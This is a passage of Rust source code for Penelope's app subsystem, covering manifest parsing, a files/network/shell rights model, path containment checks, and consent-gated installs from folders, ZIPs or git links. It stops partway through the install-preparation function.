//! Apps: small programs inside Penelope with their own surface.
//!
//! An app is a folder under `.penelope/apps/NAME/` with a manifest, `.penelope-app.json` or `app.json`:
//! `{"name": "cluster-view", "version": "1.0.0", "description": "...", "view": "clusters",
//!   "rights": {"files": true, "network": false, "shell": false}, "source": "https://..."}`.
//! `entry` names an HTML file inside the app folder; `entry` or `view` may name the built-in view `clusters`
//! instead. Every manifest path is checked against the app folder, so an entry cannot leave it.
//!
//! An install copies or clones the app into `.penelope/apps/NAME/` only after `plugins::check` read its scripts. The
//! interface shows the rights and waits for a yes. A non-interactive install (`--yes`) needs the agreement in
//! `config.json`: `"apps": {"allow_install": true, "rights": {"files": true, ...}}`.
//!
//! Rights are enforced at the one gate each kind of access goes through: `file_text` and `data_dir` stay inside
//! `.penelope`, `fetch` needs `network`, `shell` needs `shell`. The built-in cluster view may read `.penelope/clusters`
//! without a `files` right; it still has no network and no shell unless its manifest grants them.

use crate::config::Ctx;
use serde_json::{json, Value};
use std::fs;
use std::io::{IsTerminal, Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

pub const MANIFEST: &str = ".penelope-app.json";
pub const ALT_MANIFEST: &str = "app.json";
const MAX_MANIFEST: u64 = 512 * 1024;
const MAX_DATA: u64 = 2 * 1024 * 1024;
const MAX_COPY_FILES: usize = 4_000;
const MAX_COPY_BYTES: u64 = 100 * 1024 * 1024;
const COPY_SKIP_DIRS: [&str; 3] = [".git", "node_modules", "target"];

/// What an app may reach. A missing right is a refusal, never a warning.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Rights {
    pub files: bool,
    pub network: bool,
    pub shell: bool,
}

impl Rights {
    /// Reads an object, a list such as `["files", "network"]`, or a text such as `"files, network"`.
    pub fn parse(value: &Value) -> Rights {
        match value {
            Value::Object(map) => Rights {
                files: map.get("files").and_then(Value::as_bool).unwrap_or(false),
                network: map.get("network").and_then(Value::as_bool).unwrap_or(false),
                shell: map.get("shell").and_then(Value::as_bool).unwrap_or(false),
            },
            Value::Array(list) => {
                let has = |name: &str| list.iter().any(|v| v.as_str().map(|s| s.eq_ignore_ascii_case(name)).unwrap_or(false));
                Rights { files: has("files"), network: has("network"), shell: has("shell") }
            }
            Value::String(text) => {
                let lower = text.trim().to_ascii_lowercase();
                if lower == "all" {
                    return Rights { files: true, network: true, shell: true };
                }
                let has = |name: &str| lower.split([',', ' ', '|']).any(|word| word == name);
                Rights { files: has("files"), network: has("network"), shell: has("shell") }
            }
            _ => Rights::default(),
        }
    }

    pub fn names(self) -> Vec<&'static str> {
        [(self.files, "files"), (self.network, "network"), (self.shell, "shell")]
            .into_iter().filter_map(|(on, name)| on.then_some(name)).collect()
    }

    /// The rights a person would see before a yes, and the ones that stay closed.
    pub fn summary(self) -> String {
        let granted = self.names();
        let missing: Vec<&str> = [(self.files, "files"), (self.network, "network"), (self.shell, "shell")]
            .into_iter().filter_map(|(on, name)| (!on).then_some(name)).collect();
        if granted.is_empty() {
            format!("none (no {})", missing.join(", "))
        } else if missing.is_empty() {
            granted.join(", ")
        } else {
            format!("{} · no {}", granted.join(", "), missing.join(", "))
        }
    }

    fn missing_from(self, allowed: Rights) -> Vec<&'static str> {
        let mut out = Vec::new();
        if self.files && !allowed.files { out.push("files"); }
        if self.network && !allowed.network { out.push("network"); }
        if self.shell && !allowed.shell { out.push("shell"); }
        out
    }
}

/// The surface of an app. HTML is opened in the browser; the cluster view is drawn in the interface.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum View {
    Clusters,
    Html(String),
}

impl View {
    pub fn name(&self) -> String {
        match self {
            View::Clusters => "clusters (built-in)".to_string(),
            View::Html(path) => format!("html: {}", path),
        }
    }

    pub fn builtin(&self) -> bool {
        matches!(self, View::Clusters)
    }
}

/// One installed app. `folder` is the name under `.penelope/apps`; `name` is the readable name of the manifest.
#[derive(Clone, Debug)]
pub struct App {
    pub name: String,
    pub folder: String,
    pub dir: PathBuf,
    pub version: String,
    pub description: String,
    pub view: View,
    pub rights: Rights,
    pub source: String,
}

fn now_secs() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn stamp() -> u128 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0)
}

fn safe(name: &str) -> String {
    name.chars().map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' { c } else { '-' }).collect()
}

fn valid_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name.chars().next().map(|c| c.is_ascii_alphanumeric()).unwrap_or(false)
        && name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// A path from a manifest or an app call. It must stay below the folder it is joined to: no root, no drive, no `..`,
/// no `~` and no backslash (which is a separator on Windows and would slip past a Unix check).
pub(crate) fn clean_relative(text: &str) -> Result<PathBuf, String> {
    let text = text.trim();
    if text.is_empty() {
        return Err("the path is empty".to_string());
    }
    if text.contains('\0') || text.contains('\\') {
        return Err(format!("{} is not a plain relative path", text));
    }
    if text.starts_with('~') {
        return Err(format!("{} escapes into the home folder", text));
    }
    let path = Path::new(text);
    if path.is_absolute() {
        return Err(format!("{} is an absolute path", text));
    }
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::Normal(part) => out.push(part),
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(format!("{} escapes the folder", text));
            }
        }
    }
    if out.as_os_str().is_empty() {
        return Err(format!("{} names no file", text));
    }
    Ok(out)
}

fn manifest_path(dir: &Path) -> Option<PathBuf> {
    [MANIFEST, ALT_MANIFEST].into_iter().map(|name| dir.join(name)).find(|path| path.exists())
}

fn read_manifest(dir: &Path) -> Result<Value, String> {
    let Some(path) = manifest_path(dir) else {
        return Err(format!("no manifest {MANIFEST} or {ALT_MANIFEST} in {}", dir.display()));
    };
    let meta = fs::symlink_metadata(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))?;
    if !meta.file_type().is_file() {
        return Err(format!("{} must be a regular file, not a link", path.display()));
    }
    if meta.len() > MAX_MANIFEST {
        return Err(format!("{} is larger than {} KB", path.display(), MAX_MANIFEST / 1024));
    }
    let text = fs::read_to_string(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))?;
    let value: Value = serde_json::from_str(&text).map_err(|e| format!("{} is not JSON: {}", path.display(), e))?;
    if !value.is_object() {
        return Err(format!("{} must hold one JSON object", path.display()));
    }
    Ok(value)
}

/// `entry` or `view` value that names the cluster view instead of a file.
fn is_cluster_view(text: &str) -> bool {
    matches!(text.trim().to_ascii_lowercase().as_str(), "clusters" | "cluster-view" | "builtin:clusters" | "builtin:cluster-view" | "view:clusters")
}

/// A file below `dir`, canonicalized, so a symlink cannot point out of the app folder.
fn relative_file(dir: &Path, text: &str) -> Result<PathBuf, String> {
    let clean = clean_relative(text)?;
    let root = fs::canonicalize(dir).map_err(|e| format!("cannot read the app folder {}: {}", dir.display(), e))?;
    let path = fs::canonicalize(root.join(&clean))
        .map_err(|_| format!("{} is missing in the app folder", clean.display()))?;
    if !path.starts_with(&root) {
        return Err(format!("{} escapes the app folder", clean.display()));
    }
    if !path.is_file() {
        return Err(format!("{} is not a file", clean.display()));
    }
    Ok(path)
}

fn parse_app(dir: &Path, folder: &str, manifest: &Value) -> Result<App, String> {
    let name = manifest["name"].as_str().map(str::trim).filter(|s| !s.is_empty()).unwrap_or(folder).to_string();
    if !valid_name(&name) {
        return Err(format!("app name {} must be letters, digits, - _ or . and start with a letter or digit", name));
    }
    let version = manifest["version"].as_str().unwrap_or("0.0.0").trim().to_string();
    let description = manifest["description"].as_str().unwrap_or("").trim().to_string();
    let source = manifest["source"].as_str().or_else(|| manifest["install_source"].as_str()).unwrap_or("").trim().to_string();
    let rights = Rights::parse(&manifest["rights"]);
    let entry = manifest["entry"].as_str().or_else(|| manifest["html"].as_str()).map(str::trim).filter(|s| !s.is_empty());
    let named = manifest["view"].as_str().map(str::trim).filter(|s| !s.is_empty());
    let view = match (entry, named) {
        (Some(entry), _) if is_cluster_view(entry) => View::Clusters,
        (Some(entry), _) => {
            let clean = clean_relative(entry)?;
            relative_file(dir, entry)?;
            View::Html(clean.to_string_lossy().to_string())
        }
        (None, Some(name)) if is_cluster_view(name) => View::Clusters,
        (None, Some(name)) if name.eq_ignore_ascii_case("html") => {
            return Err("view html needs an entry path, for example \"entry\": \"index.html\"".to_string());
        }
        (None, Some(name)) => return Err(format!("unknown built-in view {}. Use clusters or an entry HTML path.", name)),
        (None, None) => return Err(format!("the manifest has no entry HTML and no built-in view (clusters)")),
    };
    Ok(App {
        name,
        folder: folder.to_string(),
        dir: dir.to_path_buf(),
        version: if version.is_empty() { "0.0.0".to_string() } else { version },
        description,
        view,
        rights,
        source,
    })
}

/// Reads one app folder. A broken manifest or an entry outside the folder is an error, never a half-read app.
pub fn load_dir(dir: &Path) -> Result<App, String> {
    let dir = fs::canonicalize(dir).map_err(|_| format!("no app folder {}", dir.display()))?;
    let folder = dir.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
    if folder.is_empty() {
        return Err(format!("{} has no folder name", dir.display()));
    }
    let manifest = read_manifest(&dir)?;
    parse_app(&dir, &folder, &manifest)
}

pub fn apps_dir(ctx: &Ctx) -> PathBuf {
    ctx.root.join("apps")
}

fn registry_path(ctx: &Ctx) -> PathBuf {
    ctx.root.join("apps.json")
}

fn registry(ctx: &Ctx) -> Value {
    let mut value = fs::read_to_string(registry_path(ctx)).ok()
        .and_then(|text| serde_json::from_str::<Value>(&text).ok())
        .filter(Value::is_object)
        .unwrap_or_else(|| json!({"active": "", "sources": {}}));
    if !value["sources"].is_object() {
        value["sources"] = json!({});
    }
    if !value["active"].is_string() {
        value["active"] = json!("");
    }
    value
}

fn save_registry(ctx: &Ctx, value: &Value) -> Result<(), String> {
    let path = registry_path(ctx);
    let tmp = path.with_extension("json.tmp");
    fs::create_dir_all(&ctx.root).map_err(|e| format!("cannot make {}: {}", ctx.root.display(), e))?;
    fs::write(&tmp, serde_json::to_string_pretty(value).unwrap()).map_err(|e| format!("cannot write {}: {}", tmp.display(), e))?;
    fs::rename(&tmp, &path).map_err(|e| format!("cannot move {}: {}", tmp.display(), e))
}

/// Every folder under `.penelope/apps` with a readable manifest, sorted by name. A broken folder is left out instead
/// of breaking the launcher; `load_dir` names the reason when the folder is used directly.
pub fn installed(ctx: &Ctx) -> Vec<App> {
    let Ok(entries) = fs::read_dir(apps_dir(ctx)) else { return Vec::new() };
    let reg = registry(ctx);
    let sources = &reg["sources"];
    let mut out = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') || !entry.path().is_dir() {
            continue;
        }
        let Ok(mut app) = load_dir(&entry.path()) else { continue };
        if app.source.is_empty() {
            if let Some(source) = sources.get(app.folder.as_str()).and_then(Value::as_str) {
                app.source = source.to_string();
            }
        }
        out.push(app);
    }
    out.sort_by(|a, b| a.name.to_ascii_lowercase().cmp(&b.name.to_ascii_lowercase()).then(a.folder.cmp(&b.folder)));
    out
}

pub fn find(ctx: &Ctx, name: &str) -> Option<App> {
    let name = name.trim();
    if name.is_empty() {
        return None;
    }
    installed(ctx).into_iter().find(|app| app.name == name || app.folder == name)
}

pub fn active(ctx: &Ctx) -> Option<String> {
    let name = registry(ctx)["active"].as_str().unwrap_or("").trim().to_string();
    if name.is_empty() || find(ctx, &name).is_none() {
        None
    } else {
        Some(name)
    }
}

/// `/app on NAME`: the app the launcher marks as the chosen one.
pub fn set_active(ctx: &Ctx, name: &str) -> Result<String, String> {
    let app = find(ctx, name).ok_or_else(|| format!("no app named {}. /app list shows the names.", name.trim()))?;
    let mut reg = registry(ctx);
    reg["active"] = json!(app.name);
    save_registry(ctx, &reg)?;
    Ok(format!("app {} on · /app or f7 opens the launcher; enter shows it", app.name))
}

/// `/app off`: no app is the chosen one. The folders stay installed.
pub fn off(ctx: &Ctx) -> String {
    let mut reg = registry(ctx);
    let before = reg["active"].as_str().unwrap_or("").to_string();
    reg["active"] = json!("");
    match save_registry(ctx, &reg) {
        Ok(_) if before.is_empty() => "no app was on".to_string(),
        Ok(_) => format!("app {} off · it stays installed and starts from /app again", before),
        Err(e) => format!("NOT changed. {}", e),
    }
}

/// Deletes one installed app and its folder. The source folder of a local install is not touched.
pub fn remove(ctx: &Ctx, name: &str) -> Result<String, String> {
    let app = find(ctx, name).ok_or_else(|| format!("no app named {}. /app list shows the names.", name.trim()))?;
    let base = fs::canonicalize(apps_dir(ctx)).unwrap_or_else(|_| apps_dir(ctx));
    if !app.dir.starts_with(&base) {
        return Err(format!("NOT removed. {} is not below {}", app.dir.display(), base.display()));
    }
    fs::remove_dir_all(&app.dir).map_err(|e| format!("NOT removed. {} stays: {}", app.dir.display(), e))?;
    let mut reg = registry(ctx);
    if reg["active"].as_str() == Some(app.name.as_str()) {
        reg["active"] = json!("");
    }
    if let Some(sources) = reg["sources"].as_object_mut() {
        sources.remove(&app.folder);
        sources.remove(&app.name);
    }
    save_registry(ctx, &reg)?;
    Ok(format!("app {} removed · folder {} deleted", app.name, crate::files::show(&app.dir)))
}

pub fn list(ctx: &Ctx) -> String {
    let apps = installed(ctx);
    if apps.is_empty() {
        return "no app installed. /app install LINK|DIR|ZIP installs one from a folder, a ZIP or a git link with .penelope-app.json or app.json.\n".to_string();
    }
    let active = active(ctx);
    let mut out = String::from("Apps\n\n");
    for app in &apps {
        let mark = if active.as_deref() == Some(app.name.as_str()) { "●" } else { "○" };
        out.push_str(&format!("{} {:<22} {:<10} view {:<22} rights {}\n", mark, app.name, app.version, app.view.name(), app.rights.summary()));
        if !app.description.is_empty() {
            out.push_str(&format!("    {}\n", app.description.chars().take(140).collect::<String>()));
        }
    }
    out.push_str("\n/app opens the launcher. /app update NAME pulls a git app after a check and a yes. /app on NAME chooses the app the launcher marks, /app off clears it.\n");
    out
}

#[allow(dead_code)] // the network, shell and fetch gates are public for apps and tests; the interface uses the read gate
impl App {
    fn require_files(&self) -> Result<(), String> {
        if self.rights.files || self.view.builtin() {
            Ok(())
        } else {
            Err(format!("app {} has no files right. Add \"files\": true to its rights and install it again.", self.name))
        }
    }

    fn confined(&self, ctx: &Ctx, rel: &str) -> Result<PathBuf, String> {
        let clean = clean_relative(rel)?;
        self.require_files()?;
        let root = fs::canonicalize(&ctx.root).map_err(|e| format!("cannot read {}: {}", ctx.root.display(), e))?;
        let path = fs::canonicalize(ctx.root.join(&clean))
            .map_err(|_| format!("no file or folder {} in .penelope", clean.display()))?;
        if !path.starts_with(&root) {
            return Err(format!("{} escapes .penelope", clean.display()));
        }
        Ok(path)
    }

    /// Reads one file below `.penelope`. The path is checked again at every call, not only at install time.
    pub fn file_text(&self, ctx: &Ctx, rel: &str) -> Result<String, String> {
        let path = self.confined(ctx, rel)?;
        let meta = fs::metadata(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))?;
        if !meta.is_file() {
            return Err(format!("{} is not a file", path.display()));
        }
        if meta.len() > MAX_DATA {
            return Err(format!("{} is larger than {} KB", path.display(), MAX_DATA / 1024));
        }
        fs::read_to_string(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))
    }

    /// Lists one folder below `.penelope`. Symlinks are resolved before the containment check.
    pub fn data_dir(&self, ctx: &Ctx, rel: &str) -> Result<Vec<PathBuf>, String> {
        let path = self.confined(ctx, rel)?;
        if !path.is_dir() {
            return Err(format!("{} is not a folder", path.display()));
        }
        let mut out: Vec<PathBuf> = fs::read_dir(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))?
            .flatten()
            .filter_map(|entry| {
                let meta = fs::symlink_metadata(entry.path()).ok()?;
                meta.file_type().is_file().then(|| entry.path())
            })
            .collect();
        out.sort();
        Ok(out)
    }

    pub fn require_network(&self) -> Result<(), String> {
        if self.rights.network {
            Ok(())
        } else {
            Err(format!("app {} has no network right. Add \"network\": true to its rights and install it again.", self.name))
        }
    }

    pub fn require_shell(&self) -> Result<(), String> {
        if self.rights.shell {
            Ok(())
        } else {
            Err(format!("app {} has no shell right. Add \"shell\": true to its rights and install it again.", self.name))
        }
    }

    /// A guarded download for an app that was granted `network`. Redirects are not followed, as everywhere in Penelope.
    pub fn fetch(&self, url: &str) -> Result<String, String> {
        self.require_network()?;
        let url = url.trim();
        if !(url.starts_with("https://") || url.starts_with("http://")) {
            return Err(format!("{} is not an http or https link", url));
        }
        let response = crate::net::agent(30).get(url).call().map_err(|e| format!("the app fetch failed: {}", e))?;
        if !(200..300).contains(&response.status()) {
            return Err(format!("the server answered with {}", response.status()));
        }
        let mut bytes = Vec::new();
        response.into_reader().take(MAX_DATA).read_to_end(&mut bytes).map_err(|e| format!("the app fetch failed: {}", e))?;
        Ok(String::from_utf8_lossy(&bytes).to_string())
    }

    /// A guarded shell command for an app that was granted `shell`. Without the right nothing is started.
    pub fn shell(&self, command: &str) -> Result<String, String> {
        self.require_shell()?;
        if command.trim().is_empty() {
            return Err("the shell command is empty".to_string());
        }
        let out = crate::platform::shell(command).output().map_err(|e| format!("the app shell failed: {}", e))?;
        let mut text = String::from_utf8_lossy(&out.stdout).to_string();
        let stderr = String::from_utf8_lossy(&out.stderr);
        if !stderr.trim().is_empty() {
            if !text.is_empty() && !text.ends_with('\n') { text.push('\n'); }
            text.push_str(&stderr);
        }
        if !out.status.success() {
            return Err(format!("app {} shell command exited {}:\n{}", self.name,
                               out.status.code().map(|c| c.to_string()).unwrap_or_else(|| "a signal".to_string()),
                               text.chars().take(2_000).collect::<String>()));
        }
        Ok(text)
    }

    /// The HTML file of an app, checked against the app folder again in case the link changed after the install.
    pub fn entry_path(&self) -> Result<PathBuf, String> {
        match &self.view {
            View::Html(path) => relative_file(&self.dir, path),
            View::Clusters => Err(format!("app {} is a built-in view, not an HTML app", self.name)),
        }
    }
}

/// The built-in cluster view. Two running clusters are enough for the first app; the parts stay visible and every
/// line carries id, state and progress. The read goes through the app gate and stays inside `.penelope/clusters`.
pub fn cluster_view(ctx: &Ctx, app: &App) -> Result<String, String> {
    if !app.view.builtin() {
        return Err(format!("app {} is not the built-in cluster view", app.name));
    }
    let base = ctx.root.join("clusters");
    if !base.is_dir() {
        return Ok("No running cluster · .penelope/clusters does not exist yet. /cluster GOAL starts one.\n".to_string());
    }
    let files = app.data_dir(ctx, "clusters")?;
    let mut running: Vec<Value> = Vec::new();
    let mut stored = 0usize;
    for path in files {
        if path.extension().and_then(|x| x.to_str()) != Some("json") {
            continue;
        }
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else { continue };
        let Ok(text) = app.file_text(ctx, &format!("clusters/{}", name)) else { continue };
        let Ok(value) = serde_json::from_str::<Value>(&text) else { continue };
        let id = value["id"].as_str().unwrap_or("").trim();
        if id.is_empty() {
            continue;                       // scores.json and other helpers are not clusters
        }
        stored += 1;
        let state = value["state"].as_str().unwrap_or("queued");
        if matches!(state, "queued" | "working" | "validating" | "killing") {
            running.push(value);
        }
    }
    if running.is_empty() {
        return Ok(if stored == 0 {
            "No running cluster · no cluster state in .penelope/clusters yet. /cluster GOAL starts one.\n".to_string()
        } else {
            format!("No running cluster · {} stored cluster{} finished. /clusters shows the tree.\n", stored, if stored == 1 { "" } else { "s" })
        });
    }
    running.sort_by_key(|c| c["started"].as_u64().unwrap_or(0));
    let clock = now_secs();
    let mut out = format!("Clusters · {} running · read from {}\n\n", running.len(), crate::files::show(&base));
    for cluster in &running {
        let id = cluster["id"].as_str().unwrap_or("?");
        let state = cluster["state"].as_str().unwrap_or("?");
        let name = cluster["name"].as_str().unwrap_or("");
        let done = cluster["done"].as_u64().unwrap_or(0);
        let total = cluster["total"].as_u64().unwrap_or(0);
        let started = cluster["started"].as_u64().unwrap_or(0);
        let elapsed = if started > 0 { clock.saturating_sub(started) } else { 0 };
        out.push_str(&format!("● {:<22} {:<10} P:{}/{}  {:>4}s  {}\n", id, state, done, total, elapsed, name));
        for part in cluster["parts"].as_array().cloned().unwrap_or_default() {
            out.push_str(&format!("    {:<14} {:<10} {:<10} {}\n",
                                  part["name"].as_str().unwrap_or("?"), part["role"].as_str().unwrap_or(""),
                                  part["state"].as_str().unwrap_or(""), part["model"].as_str().unwrap_or("")));
        }
    }
    out.push_str("\n/app shows this view in the interface. /cluster status ID shows one cluster with its memory.\n");
    Ok(out)
}

/// Opens the HTML entry of an app in the browser. The launcher does this, not the app, so no shell right is needed.
pub fn open_in_browser(app: &App) -> Result<String, String> {
    let path = app.entry_path()?;
    let shown = crate::files::show(&path);
    #[cfg(windows)]
    let child = {
        let path = path.to_string_lossy().to_string();
        Command::new("cmd").args(["/C", "start", "", &path]).stdout(Stdio::null()).stderr(Stdio::null()).spawn()
    };
    #[cfg(target_os = "macos")]
    let child = Command::new("open").arg(&path).stdout(Stdio::null()).stderr(Stdio::null()).spawn();
    #[cfg(not(any(windows, target_os = "macos")))]
    let child = {
        let program = ["xdg-open", "sensible-browser", "x-www-browser"].into_iter()
            .find(|name| crate::config::which(name).is_some())
            .ok_or_else(|| "no browser opener found (xdg-open, sensible-browser or x-www-browser)".to_string())?;
        Command::new(program).arg(&path).stdout(Stdio::null()).stderr(Stdio::null()).spawn()
    };
    match child {
        Ok(mut child) => {
            std::thread::spawn(move || { let _ = child.wait(); });
            Ok(format!("app {} opened in the browser · {}", app.name, shown))
        }
        Err(e) => Err(format!("the browser did not start: {}", e)),
    }
}

/// One checked install or update that waits for the yes. Nothing is in `.penelope/apps/NAME` before `commit`.
#[derive(Debug)]
pub struct Prepared {
    pub app: App,
    pub source: String,
    pub staging: PathBuf,
    pub target: PathBuf,
    pub check: String,
    /// True when `commit` replaces the installed folder instead of creating it.
    pub update: bool,
    /// The version that was installed before an update, for the report.
    pub version_before: Option<String>,
}

impl Prepared {
    /// The report a person reads before the yes: app, view, rights, source and how much the check read.
    pub fn report(&self) -> String {
        let mut out = format!("name:     {} {}\n", self.app.name, self.app.version);
        if let Some(before) = &self.version_before {
            if before != &self.app.version {
                out.push_str(&format!("update:   {} -> {}\n", before, self.app.version));
            }
        }
        if !self.app.description.is_empty() {
            out.push_str(&format!("about:    {}\n", self.app.description));
        }
        out.push_str(&format!("view:     {}\n", self.app.view.name()));
        out.push_str(&format!("rights:   {}\n", self.app.rights.summary()));
        out.push_str(&format!("source:   {}\n", self.source));
        out.push_str(&format!("folder:   {}\n", crate::files::show(&self.target)));
        out.push_str(&format!("check:    {}", self.check.trim_start_matches("check: ")));
        out
    }
}

fn cleanup(path: &Path) {
    let _ = fs::remove_dir_all(path);
}

fn is_remote(target: &str) -> bool {
    ["http://", "https://", "git@", "ssh://", "git://", "file://"].iter().any(|prefix| target.starts_with(prefix))
}

fn copy_tree(from: &Path, to: &Path) -> Result<usize, String> {
    copy_tree_with(from, to, false)
}

/// Copies a folder. `keep_git` keeps `.git`, which a staging copy of a git install needs for `git pull`.
fn copy_tree_with(from: &Path, to: &Path, keep_git: bool) -> Result<usize, String> {
    fs::create_dir_all(to).map_err(|e| format!("cannot make {}: {}", to.display(), e))?;
    let mut files = 0usize;
    let mut bytes = 0u64;
    let mut stack = vec![(from.to_path_buf(), to.to_path_buf(), 0usize)];
    while let Some((src, dst, depth)) = stack.pop() {
        if depth > 32 {
            return Err("the app folder is deeper than 32 levels".to_string());
        }
        let entries = fs::read_dir(&src).map_err(|e| format!("cannot read {}: {}", src.display(), e))?;
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            let meta = fs::symlink_metadata(&path).map_err(|e| format!("cannot read {}: {}", path.display(), e))?;
            if meta.file_type().is_symlink() {
                continue;
            }
            if meta.is_dir() {
                if COPY_SKIP_DIRS.contains(&name.as_str()) && !(keep_git && name == ".git") {
                    continue;
                }
                let next = dst.join(&name);
                fs::create_dir_all(&next).map_err(|e| format!("cannot make {}: {}", next.display(), e))?;
                stack.push((path, next, depth + 1));
            } else if meta.is_file() {
                if files >= MAX_COPY_FILES {
                    return Err(format!("the app has more than {} files", MAX_COPY_FILES));
                }
                bytes = bytes.saturating_add(meta.len());
                if bytes > MAX_COPY_BYTES {
                    return Err(format!("the app is larger than {} MB", MAX_COPY_BYTES / 1024 / 1024));
                }
                let next = dst.join(&name);
                fs::copy(&path, &next).map_err(|e| format!("cannot copy {} to {}: {}", path.display(), next.display(), e))?;
                files += 1;
            }
        }
    }
    Ok(files)
}

fn git_clone(target: &str, staging: &Path) -> Result<(), String> {
    let out = Command::new("git").args(["clone", "--depth", "1", target, &staging.to_string_lossy()]).output()
        .map_err(|e| format!("NOT installed. git could not start: {}", e))?;
    if !out.status.success() {
        return Err(format!("NOT installed. git clone said: {}",
                           String::from_utf8_lossy(&out.stderr).trim().chars().take(300).collect::<String>()));
    }
    Ok(())
}

fn config_grants(ctx: &Ctx, app: &App, verb: &str) -> Result<(), String> {
    let section = &ctx.cfg["apps"];
    let config = crate::files::show(&ctx.root.join("config.json"));
    if !section["allow_install"].as_bool().unwrap_or(false) {
        return Err(format!("NOT {}. No person can answer yes here. Add --yes and set \"apps\": {{\"allow_install\": true}} in {}.",
                           verb, config));
    }
    let allowed = Rights::parse(&section["rights"]);
    let missing = app.rights.missing_from(allowed);
    if !missing.is_empty() {
        return Err(format!("NOT {}. app {} asks for the right{} {} and no person can grant {} here. Add {} under \"apps\": {{\"rights\": ...}} in {}.",
                           verb, app.name, if missing.len() == 1 { "" } else { "s" }, missing.join(", "),
                           if missing.len() == 1 { "it" } else { "them" }, missing.join(", "), config));
    }
    Ok(())
}

fn zip_target(target: &str) -> bool {
    let path = target.split(['?', '#']).next().unwrap_or(target).to_ascii_lowercase();
    path.ends_with(".zip")
}

/// A folder name for the staging area from a ZIP path or link. The manifest decides the final name later.
fn zip_leaf(target: &str) -> String {
    let path = target.split(['?', '#']).next().unwrap_or(target).trim_end_matches('/');
    let leaf = path.rsplit('/').next().unwrap_or("app");
    let leaf = leaf.strip_suffix(".zip").or_else(|| leaf.strip_suffix(".ZIP")).unwrap_or(leaf);
    let leaf = safe(leaf);
    if leaf.is_empty() { "app".to_string() } else { leaf }
}

/// Unpacks a ZIP into a hidden staging folder below `.penelope/apps`. A single wrapping folder in the archive becomes
/// the staging folder itself, so the manifest is found at its root.
fn stage_zip(ctx: &Ctx, archive: &Path, leaf: &str) -> Result<PathBuf, String> {
    let base = apps_dir(ctx);
    fs::create_dir_all(&base).map_err(|e| format!("NOT installed. cannot make {}: {}", base.display(), e))?;
    let container = base.join(format!(".{}-unpack-{}", safe(leaf), stamp()));
    let unpacked = crate::files::extract_zip(archive, &container)
        .map_err(|e| format!("NOT installed. {}", e.trim_start_matches("NOT unpacked. ")))?;
    let root = unpacked.top.clone().unwrap_or_else(|| container.clone());
    if root == container {
        return Ok(container);
    }
    let staging = base.join(format!(".{}-install-{}", safe(leaf), stamp()));
    if let Err(e) = fs::rename(&root, &staging) {
        cleanup(&container);
        return Err(format!("NOT installed. the unpacked folder could not be staged: {}", e));
    }
    cleanup(&container);
    Ok(staging)
}

/// Unpacks a ZIP path or a ZIP link. `file://` is read locally; http(s) is downloaded to the temp folder and removed
/// after unpacking. Redirects are never followed, as everywhere in Penelope.
fn stage_zip_from_target(ctx: &Ctx, target: &str, leaf: &str) -> Result<PathBuf, String> {
    if let Some(path) = target.strip_prefix("file://") {
        let archive = PathBuf::from(path);
        if !archive.is_file() {
            return Err(format!("NOT installed. {} is no ZIP file.", archive.display()));
        }
        return stage_zip(ctx, &archive, leaf);
    }
    let tmp = std::env::temp_dir().join(format!("penelope-app-{}-{}.zip", std::process::id(), stamp()));
    let result = (|| -> Result<PathBuf, String> {
        let response = match crate::net::agent(60).get(target).call() {
            Ok(r) if (200..300).contains(&r.status()) => r,
            Ok(r) => return Err(format!("NOT installed. The server answered with {}.", r.status())),
            Err(e) => return Err(format!("NOT installed. The ZIP could not be loaded: {}", e)),
        };
        let mut bytes = Vec::new();
        response.into_reader().take(MAX_COPY_BYTES + 1).read_to_end(&mut bytes)
            .map_err(|e| format!("NOT installed. The ZIP could not be read: {}", e))?;
        if bytes.len() as u64 > MAX_COPY_BYTES {
            return Err(format!("NOT installed. The ZIP is larger than {} MB.", MAX_COPY_BYTES / 1024 / 1024));
        }
        fs::write(&tmp, &bytes).map_err(|e| format!("NOT installed. The ZIP could not be stored: {}", e))?;
        stage_zip(ctx, &tmp, leaf)
    })();
    let _ = fs::remove_file(&tmp);
    result
}

/// Copies or clones an app, runs the install check and returns it with its rights. `unattended` is the `--yes` path:
/// then the rights must already be allowed in `config.json`. On every error the staging folder is removed again.
pub fn prepare(ctx: &Ctx, target: &str, unattended: bool) -> Result<Prepared, String> {
    let target = target.trim().trim_matches(|c| c == '"' || c == '\'');
    if target.is_empty() {
        return Err("NOT installed. Give a git link, a folder or a ZIP: /app install LINK|DIR|ZIP".to_string());
    }
    let base = apps_dir(ctx);
    fs::create_dir_all(&base).map_err(|e| format!("NOT installed. cannot make {}: {}", base.display(), e))?;

    let local = !is_remote(target) && Path::new(target).is_dir();
    let local_zip = !is_remote(target) && Path::new(target).is_file() && zip_target(target);
    let (staging, source) = if local {
        let src = PathBuf::from(target);
        let src = fs::canonicalize(&src).map_err(|_| format!("NOT installed. {} is no folder and no link.", target))?;
        let apps = fs::canonicalize(&base).unwrap_or_else(|_| base.clone());
        if src.starts_with(&apps) {
            return Err(format!("NOT installed. {} is already inside {}. Install from the source folder.", src.display(), apps.display()));
        }
        let folder = src.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "app".to_string());
        let staging = base.join(format!(".{}-install-{}", safe(&folder), stamp()));
